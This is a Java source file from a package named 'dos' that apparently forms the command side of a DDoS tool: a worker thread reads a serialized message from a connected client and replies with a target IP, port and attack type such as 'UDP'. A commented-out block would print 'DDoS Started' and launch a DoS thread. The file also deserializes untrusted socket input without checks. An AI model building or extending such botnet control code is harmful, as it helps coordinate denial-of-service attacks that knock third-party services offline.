package dos;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

public class WorkerThread extends Thread {

	Socket client = null;
        String ip=null;
        String port=null;
        String type=null;

	public WorkerThread(Socket client,String ip,String port,String type) {
		this.client = client;
                this.ip=ip;
                this.port=port;
                this.type=type;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub

		try {
			ObjectInputStream ois = new ObjectInputStream(
					client.getInputStream());
			Object o = ois.readObject();

			if (o instanceof Message) {
				Message m = (Message) o;
				System.out.println(m.getMessage());

				ObjectOutputStream oos = new ObjectOutputStream(
						client.getOutputStream());

				Message m1 = new Message();
				m1.setMessage("Hello..!! you are connected");
				m1.setAttack_type("UDP");
                                m1.setIp(ip);
                                m1.setPort(port);
				m1.setAttack_type(type);
                                
				oos.writeObject(m1);

//				if (m.getM_type().equals("reply")) {
//					System.out.println("DDoS Started");
//
//					new Thread(new DoS()).start();
//				}

				ois.close();
				oos.flush();
				oos.close();				
			}			
		} catch (Exception ex) {
			System.out.println(ex.getMessage());
		}
		

	}

}
